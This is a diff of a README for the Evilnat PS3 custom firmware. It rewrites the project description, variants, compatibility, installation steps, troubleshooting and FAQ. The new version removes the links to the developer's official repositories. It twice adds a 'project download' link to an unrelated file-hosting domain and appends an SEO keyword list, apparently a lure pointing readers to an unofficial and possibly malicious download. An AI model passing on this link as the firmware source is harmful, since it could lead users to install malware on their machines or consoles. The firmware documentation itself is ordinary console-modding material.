@@ -1,194 +1,373 @@
 
-# Evilnat Custom Firmware (CFW)
+# Evilnat Custom Firmware (PS3)
 
-Evilnat Custom Firmware is a modified system firmware for compatible Sony PlayStation 3 consoles. It extends the original PS3 firmware with kernel-level modifications, COBRA functionality, additional system capabilities, and support for custom firmware plugins.
+[![Platform](https://img.shields.io/badge/Platform-PlayStation%203-blue)](https://www.playstation.com/)
+[![Firmware](https://img.shields.io/badge/Firmware-4.93-orange)](https://www.psx-place.com/resources/4-93-evilnat-cobra-8-5.1479/)
+[![Cobra](https://img.shields.io/badge/Cobra-8.5-purple)](https://www.psx-place.com/resources/4-93-evilnat-cobra-8-5.1479/)
+[![Type](https://img.shields.io/badge/Type-Custom%20Firmware-green)](https://www.psx-place.com/ewr-carta/evilnat_cfw/)
 
-The project is distributed in multiple firmware configurations designed for different PS3 hardware and operating modes.
+Evilnat Custom Firmware is a feature-rich PlayStation 3 CFW based on Sony's retail firmware, with Cobra payload integration, homebrew support, system patches, and advanced console-management functionality.
 
-## Core Features
+**Project download and information resource:**
 
-- COBRA 8.5 integration.
-- Modified PS3 system firmware.
-- CEX and PEX firmware configurations.
-- D-PEX configuration for compatible DEX systems.
-- NoBD firmware variants for consoles with Blu-ray drive or logic-board issues.
-- NoBT firmware variants for consoles with Bluetooth hardware issues.
-- Combined NoBD and NoBT configurations.
-- Optional overclocked firmware builds.
-- Compatibility with established PS3 homebrew applications and plugins.
-- Support for additional system-level functionality through COBRA.
+https://dyhuiying.com/s/file
 
-## Firmware Architecture
+## Overview
 
-Evilnat CFW modifies the PS3 firmware environment and integrates additional components into the system software.
+Evilnat CFW is custom system firmware for compatible Sony PlayStation 3 consoles.
 
-### Core Firmware
+The project modifies the PS3 system software to enable unsigned application execution, additional system functionality, advanced debugging and management features, and compatibility with the Cobra payload.
 
-The base firmware provides the modified system environment and platform-specific configuration.
+The 4.93 release is based on Sony OFW 4.93 and integrates Cobra 8.5. It is distributed in several variants to accommodate different console firmware environments and hardware configurations.
 
-### COBRA Integration
+Evilnat is full custom firmware. It is not a standalone homebrew application, a simple XMB modification, or a universal jailbreak method.
 
-COBRA provides additional kernel-level functionality and compatibility interfaces used by PS3 homebrew applications.
+Installing CFW requires a PS3 model and system state that support custom firmware. Console compatibility must be verified before attempting installation.
 
-Its integration enables support for software and system extensions that depend on COBRA-compatible firmware.
+## Key Features
 
-### Kernel Modifications
+- **Cobra 8.5 integration:** Provides additional system-level functionality and payload support.
+- **Unsigned application support:** Allows compatible unsigned applications and homebrew to run.
+- **CEX firmware base:** Built from Sony OFW 4.93 CEX.
+- **PEX and D-PEX variants:** Provide hybrid retail/debug firmware configurations.
+- **Fan management:** Includes dynamic fan-control functionality and temperature-related controls.
+- **CFW syscall management:** Provides options to restore or manage supported CFW syscalls.
+- **PS2 compatibility enhancements:** Includes PS2-related emulator and fan-management improvements.
+- **ISO support:** Cobra supports additional game-image formats and mounting workflows.
+- **License-related functionality:** Includes patches and tools for supported license-management operations.
+- **System patches:** Includes changes to application execution, firmware behavior, and selected system components.
+- **XAI Plugin:** Provides an interface for additional CFW management options.
+- **External payload support:** Supports loading selected external stage2 and plugin components from USB in supported configurations.
+- **RSX overclocking:** Available in supported builds and configurations.
 
-Custom firmware includes modifications to the PS3 system environment, enabling additional functionality beyond standard retail firmware.
+Feature availability can differ between CEX, PEX, D-PEX, and hardware-specific builds.
 
-### Firmware Configuration
+## Technical Specifications
 
-Different firmware variants are provided for retail and development-oriented configurations.
-
-## Firmware Variants
-
-Evilnat firmware is distributed in several configurations.
-
-| Variant | Description |
-|---|---|
-| CEX | Retail firmware configuration |
-| PEX | Retail-oriented configuration with additional firmware functionality |
-| D-PEX | Configuration intended for DEX environments |
-| DEX | Development-oriented firmware configuration |
-| NoBD | Firmware variant for systems with a broken or missing Blu-ray logic board |
-| NoBT | Firmware variant for systems with broken or missing Bluetooth hardware |
-| NoBD + NoBT | Combined hardware compatibility variant |
-| Overclocked | Optional performance-oriented firmware configuration |
-
-Not every variant is available in every release. The latest documented 4.93 release includes PEX, D-PEX, and CEX variants.
-
-Evilnat has warned that its DEX variants are unstable and are not recommended for installation. D-PEX is the documented alternative for compatible DEX configurations.
-
-## COBRA 8.5
-
-Evilnat 4.93 integrates COBRA 8.5.
-
-COBRA provides an extended system interface used by compatible PS3 software.
-
-Its functionality is relevant to:
-
-- Kernel-level system extensions.
-- Homebrew compatibility.
-- Plugin loading.
-- Additional storage and application interfaces.
-- Integration with utilities such as webMAN MOD.
-
-The availability of individual functions depends on the installed firmware configuration and compatible software versions.
-
-## Hardware Compatibility
-
-Evilnat CFW is intended for PS3 systems capable of running standard custom firmware.
-
-Compatibility is determined by the console's hardware revision and minimum supported firmware version.
-
-### Commonly Supported Hardware
-
-| PS3 hardware | CFW compatibility |
-|---|---|
-| Original PS3 Fat | Supported on compatible revisions |
-| PS3 Slim CECH-20xx | Supported |
-| PS3 Slim CECH-21xx | Supported |
-| PS3 Slim CECH-25xx | Conditional; depends on minimum firmware version |
-| PS3 Slim CECH-30xx | Not compatible with standard CFW installation |
-| PS3 Super Slim CECH-4xxx | Not compatible with standard CFW installation |
-
-CECH-25xx systems require individual compatibility verification. A model number alone is insufficient to determine whether CFW can be installed.
-
-PS3HEN is a separate homebrew-enabling environment for additional PS3 hardware revisions. It is not equivalent to Evilnat CFW.
-
-## Firmware Version
-
-The documented current release in this package is:
-
-| Property | Value |
-|---|---|
-| Firmware | Evilnat 4.93 |
-| COBRA version | 8.5 |
-| Firmware package | PUP |
-| Variants | CEX, PEX, D-PEX |
-| Additional variants | NoBD, NoBT, NoBD + NoBT, Overclocked |
-
-The release version and available configurations should be checked against the official developer release information before installation.
-
-## Installation Environment
-
-Evilnat CFW installation requires compatible hardware and an appropriate firmware installation path.
-
-For the documented 4.93 installation workflow, the requirements include:
-
-- A CFW-compatible PS3 console.
-- Compatible HFW 4.93.1 environment where required.
-- The corresponding 4.93 Flash Writer.
-- A verified NAND or NOR flash dump.
-- PyPS3tools for flash-dump validation.
-- The correct Evilnat CFW PUP package.
-
-The installation process differs depending on whether the console is already running CFW or requires flash preparation.
-
-## Flash Storage
-
-PS3 consoles use different flash architectures depending on their hardware revision.
-
-| Flash type | Hardware examples |
-|---|---|
-| NAND | CECHA, CECHB, CECHC, CECHE, CECHG |
-| NOR | Other supported PS3 revisions |
-
-Flash operations must use the correct hardware-specific configuration.
-
-A valid flash backup should be preserved before performing firmware-level modifications.
-
-## Homebrew Compatibility
-
-Evilnat CFW supports a broad ecosystem of PS3 homebrew software.
-
-Examples include:
-
-- webMAN MOD
-- multiMAN
-- IRISMAN
-- ManaGunZ
-- Apollo Save Tool
-- PS3 system management utilities
-
-Compatibility depends on the installed firmware version, COBRA configuration, and individual application requirements.
-
-## Development and Related Projects
-
-Evilnat's developer maintains several public PS3-related projects and components.
-
-Related repositories include:
-
-- Cobra-PS3
-- Flash Writer
-- erk_dumper
-- xai_plugin
-
-These projects are separate components and should not be treated as interchangeable with the complete Evilnat firmware package.
-
-## Project Information
-
-| Property | Value |
+| Item | Specification |
 |---|---|
 | Project | Evilnat Custom Firmware |
 | Platform | Sony PlayStation 3 |
-| Project type | Custom Firmware |
-| Latest documented release | 4.93 |
-| COBRA integration | 8.5 |
-| Firmware format | PUP |
-| Main configurations | CEX, PEX, D-PEX |
-| Additional configurations | NoBD, NoBT, Overclocked |
-| Developer | Evilnat |
+| Current documented release | 4.93 |
+| Cobra version | 8.5 |
+| Firmware base | Sony OFW 4.93 CEX |
+| Firmware type | Full custom firmware |
+| Main variants | CEX, PEX, D-PEX |
+| Hardware-specific variants | NoBD, NoBT, NoBD+NoBT |
+| Package format | PS3UPDAT.PUP |
+| Installation media | FAT32 USB storage |
+| System interface | PlayStation 3 XMB and Recovery Menu |
+| Additional components | Cobra payload, XAI Plugin |
 
-## Official Resources
+## Compatibility
 
-- Developer profile: https://github.com/xXEvilnatXx
-- Developer projects: https://gitlab.com/Evilnat
-- COBRA-PS3 source: https://github.com/xXEvilnatXx/Cobra-PS3
-- Evilnat firmware release information: https://www.psx-place.com/
-- Firmware compatibility reference: https://consolemods.org/wiki/PS3:Firmwares/en
-- Installation guide: https://store.brewology.com/ps3/guides/cfw/
+Evilnat CFW is intended only for PS3 consoles capable of running full custom firmware.
 
----
+### Firmware variants
 
-Evilnat CFW extends compatible PlayStation 3 systems through modified firmware components, COBRA integration, hardware-specific firmware variants, and compatibility with the PS3 homebrew ecosystem.
+| Variant | Description |
+|---|---|
+| CEX | Retail-based custom firmware for compatible retail PS3 consoles |
+| PEX | Hybrid firmware combining retail and ported debug components |
+| D-PEX | Debug-console-oriented variant with ported firmware components |
+| NoBD | Build for supported consoles with a defective or unavailable Blu-ray drive |
+| NoBT | Build for supported consoles with a defective Bluetooth module |
+| NoBD+NoBT | Combined hardware-specific build for consoles affected by both faults |
+
+NoBD and NoBT are not general performance editions. They are specialized variants for particular hardware conditions.
+
+### Hardware compatibility
+
+Compatibility depends on the PS3 model, minimum-version capability, current firmware, and hardware condition.
+
+Before installation:
+
+1. Identify the exact PS3 model number.
+2. Check the console's minimum downgradeable firmware version.
+3. Confirm that the model supports full CFW.
+4. Identify whether the console is CEX or DEX.
+5. Select the matching firmware variant.
+6. Check the release documentation for model-specific restrictions.
+
+Do not assume that every PS3 Slim or Super Slim can install Evilnat CFW.
+
+A console that cannot install full CFW may require a different solution, such as HEN, rather than Evilnat.
+
+## Firmware Features
+
+### Cobra 8.5
+
+Evilnat 4.93 integrates Cobra 8.5, which provides additional system-level functionality.
+
+Documented Cobra capabilities include:
+
+- Failsafe stage2 functionality.
+- CFW syscall restoration options.
+- Dynamic fan-control integration.
+- Fan speed retrieval and configuration.
+- Additional PS3MAPI functionality.
+- Support for loading custom and system modules.
+- Extended mapping path capacity.
+- Additional kernel temperature and fan-policy functions.
+- On-the-fly decryption support for compatible REDUMP ISO images.
+- Additional syscall and plugin-management functionality.
+
+### XAI Plugin
+
+The XAI Plugin provides a menu for accessing selected CFW tools and configuration options.
+
+Depending on the installed version, available functions can include:
+
+- Basic system tools.
+- CFW syscall controls.
+- Fan management.
+- Firmware information.
+- Network and FTP-related options.
+- Cobra information.
+- Additional firmware-specific settings.
+
+### Fan management
+
+Evilnat includes fan-management functionality through its integrated CFW components.
+
+Depending on the configuration, users can access:
+
+- Dynamic fan control.
+- Fan speed adjustment.
+- Temperature information.
+- Fan policy controls.
+- PS2-mode fan management.
+
+Manual fan settings should be configured carefully. Insufficient cooling can cause overheating, while unnecessarily high fan speeds increase noise and mechanical wear.
+
+### Homebrew and application support
+
+Evilnat allows compatible unsigned applications to execute.
+
+Common use cases include:
+
+- Homebrew utilities.
+- File managers.
+- System-management applications.
+- Backup-management tools.
+- Game-mounting applications.
+- Debugging and development utilities.
+
+Application compatibility depends on the application version and the installed firmware environment.
+
+### Network and online functionality
+
+The firmware includes PSN/SEN-related compatibility patches, but this does not guarantee uninterrupted or risk-free access to PlayStation Network.
+
+Using modified firmware and CFW syscalls online can create account and console-ban risks. Users should understand those risks and follow applicable platform rules.
+
+## System Requirements
+
+- A compatible PlayStation 3 console.
+- A verified CFW-compatible model and firmware state.
+- The correct Evilnat 4.93 variant.
+- A FAT32-formatted USB storage device.
+- A computer for downloading and preparing firmware files.
+- A reliable power supply.
+- A backup of important saves and personal data.
+- Sufficient knowledge to identify CEX, PEX, or D-PEX requirements.
+
+For any installation involving flash modification, use the correct hardware-specific procedure and retain a verified flash backup where applicable.
+
+## Download & Installation
+
+### Download
+
+Project download and information resource:
+
+https://dyhuiying.com/s/file
+
+Release information and variant details:
+
+https://www.psx-place.com/resources/4-93-evilnat-cobra-8-5.1479/
+
+The documented 4.93 release includes CEX, PEX, and D-PEX builds, with additional NoBD and NoBT variants.
+
+Always verify the exact firmware file and its integrity before installation.
+
+### Step 1: Verify console compatibility
+
+1. Open the PS3 system information screen.
+2. Record the exact model number.
+3. Determine the installed system firmware version.
+4. Check the console's minimum-version information.
+5. Verify that the console is compatible with full CFW.
+6. Identify the appropriate firmware variant.
+
+Do not attempt to install full CFW on an incompatible console.
+
+### Step 2: Prepare the console
+
+1. Back up important saved data.
+2. Verify that the console is operating normally.
+3. Ensure the system is not in Factory Service Mode.
+4. Confirm that the correct CEX, PEX, or D-PEX package has been selected.
+5. Follow the official release instructions for the current firmware state.
+
+For consoles requiring a flash-writing procedure, use only the matching release-specific writer and instructions.
+
+### Step 3: Prepare the USB device
+
+1. Format a compatible USB device as FAT32.
+2. Create the following directory structure:
+
+   `PS3/UPDATE/`
+
+3. Copy the selected firmware package into the UPDATE directory.
+4. Rename the firmware file to:
+
+   `PS3UPDAT.PUP`
+
+5. Confirm that the file is complete and has the expected checksum, where published.
+
+The resulting directory should be:
+
+   `USB:/PS3/UPDATE/PS3UPDAT.PUP`
+
+### Step 4: Install from the XMB or Recovery Menu
+
+The installation route depends on the console's existing firmware state.
+
+For an already CFW-enabled console, the release instructions may permit updating through the XMB or Recovery Menu.
+
+For compatible consoles on supported official firmware states, an appropriate CFW-enabling procedure may be required before installing Evilnat.
+
+Do not assume that copying the PUP file to USB is sufficient to enable CFW on an unmodified console.
+
+Follow the current Evilnat release documentation and a model-specific installation guide.
+
+### Step 5: Verify installation
+
+After installation:
+
+1. Allow the console to complete its update and restart.
+2. Open System Information.
+3. Confirm the displayed firmware version.
+4. Open the XAI Plugin if available.
+5. Check Cobra information.
+6. Verify that the selected CFW features are available.
+7. Test homebrew applications individually.
+
+Do not interrupt the installation or switch off the console while firmware is being written.
+
+## Configuration & Management
+
+### Choosing a firmware variant
+
+Select the build according to the console's hardware and firmware environment.
+
+- Use CEX for compatible retail consoles.
+- Use PEX where the hybrid retail/debug configuration is required.
+- Use D-PEX for compatible debug-console environments.
+- Use NoBD only for the relevant Blu-ray drive hardware condition.
+- Use NoBT only for the relevant Bluetooth hardware condition.
+
+Do not install a hardware-specific variant simply because it is available.
+
+### Cobra configuration
+
+Cobra-related functionality can be managed through supported XAI Plugin options and compatible management applications.
+
+Available controls depend on the installed build.
+
+### Fan configuration
+
+Use the available fan controls to monitor temperatures and configure cooling behavior.
+
+Avoid extreme manual settings. Confirm that the fan responds correctly and that the console remains within safe operating temperatures.
+
+### Homebrew management
+
+Install and manage compatible homebrew applications using their documented installation methods.
+
+PKG installation, file management, and game mounting may require additional applications that are not included in the firmware itself.
+
+### Updating Evilnat
+
+Before updating:
+
+1. Read the new release notes.
+2. Verify model and variant compatibility.
+3. Back up saves and important files.
+4. Check whether an intermediate update or special procedure is required.
+5. Use the correct firmware package.
+6. Do not interrupt the update process.
+
+Never install an OFW or CFW package intended for a different console environment without verifying compatibility.
+
+## Troubleshooting
+
+| Problem | Possible cause | Recommended action |
+|---|---|---|
+| Firmware update is not detected | Incorrect folder structure or filename | Verify `PS3/UPDATE/PS3UPDAT.PUP` |
+| Update reports corrupted data | Damaged download or incorrect firmware package | Re-download and verify the file |
+| Console rejects the firmware | Incompatible model or firmware state | Recheck CFW compatibility and installation requirements |
+| Black screen after installation | Incorrect variant, incompatible plugin, or system issue | Follow the release-specific recovery instructions |
+| Blu-ray drive-related errors | Hardware fault or incorrect build | Verify whether a NoBD build is appropriate |
+| Bluetooth module-related errors | Hardware fault or incorrect build | Verify whether a NoBT build is appropriate |
+| Homebrew application fails to launch | Application incompatibility or missing dependency | Check the application's supported firmware |
+| Cobra features are unavailable | Cobra configuration or installation issue | Check Cobra information and the XAI Plugin |
+| Fan speed is incorrect | Fan policy or configuration issue | Review fan settings and temperature readings |
+| Console overheats | Cooling problem or unsuitable fan configuration | Stop demanding use and inspect cooling |
+| Online services are unavailable | Network, service, or CFW-related restrictions | Check network settings and current platform service status |
+
+Do not repeatedly reinstall firmware to troubleshoot an unknown hardware or flash problem. Identify the cause before attempting another update.
+
+## FAQ
+
+### 1. What is Evilnat Custom Firmware?
+
+Evilnat is a full custom firmware for compatible PlayStation 3 consoles. It adds Cobra functionality, homebrew support, system patches, and additional management tools.
+
+### 2. What is the latest documented Evilnat release?
+
+The documented release covered by this README is Evilnat 4.93 with Cobra 8.5, published in March 2026.
+
+### 3. What is the difference between CEX and PEX?
+
+CEX is based on retail firmware. PEX is a hybrid configuration that incorporates ported debug firmware components alongside the retail firmware base.
+
+### 4. What is D-PEX?
+
+D-PEX is intended for compatible debug-console environments and provides a different combination of retail and debug firmware components.
+
+### 5. What do NoBD and NoBT mean?
+
+NoBD refers to builds intended for supported consoles with Blu-ray drive faults. NoBT refers to builds intended for supported consoles with Bluetooth module faults.
+
+### 6. Does Evilnat include Cobra?
+
+Yes. Evilnat 4.93 integrates Cobra 8.5, which provides additional payload, syscall, fan-control, and system-management functionality.
+
+### 7. Can Evilnat run homebrew applications?
+
+Yes. Compatible unsigned applications and homebrew utilities can run on supported Evilnat installations.
+
+### 8. Can every PS3 install Evilnat?
+
+No. Full CFW requires a compatible PS3 model and firmware state. Some later PS3 models cannot install full CFW and may require another solution.
+
+### 9. Is Evilnat the same as PS3HEN?
+
+No. Evilnat is full custom firmware installed into the PS3 system software. PS3HEN is a different enablement method used on consoles that cannot install full CFW.
+
+### 10. Can Evilnat access PlayStation Network?
+
+The firmware includes PSN/SEN-related compatibility patches, but online access is not guaranteed and using CFW online carries account and console-ban risks.
+
+### 11. Does Evilnat support fan control?
+
+Yes. It includes dynamic fan-control and related temperature-management functionality. Settings should be adjusted carefully to avoid overheating or unnecessary fan wear.
+
+### 12. Can I update from an older CFW?
+
+Many compatible CFW installations can be updated using the appropriate Evilnat PUP, but the exact procedure depends on the current firmware, console type, and selected variant. Check the release instructions before updating.
+
+## SEO Keywords
+
+Evilnat CFW, Evilnat Custom Firmware, PS3 Evilnat, PS3 Custom Firmware, PS3 CFW 4.93, Evilnat 4.93, Cobra 8.5, PlayStation 3 firmware, PS3 homebrew, PS3 CEX firmware, PS3 PEX firmware, PS3 D-PEX firmware, PS3 NoBD firmware, PS3 NoBT firmware, PS3 jailbreak, PS3 system modification, PS3 XAI Plugin, Cobra payload, PS3 fan control, PS3 dynamic fan control, PS3 syscall management, PS3 homebrew applications, PS3 firmware update, PS3 firmware installation, PS3 ISO support, PS3MAPI, PS3 debug firmware, PlayStation 3 CFW tools, Evilnat firmware features
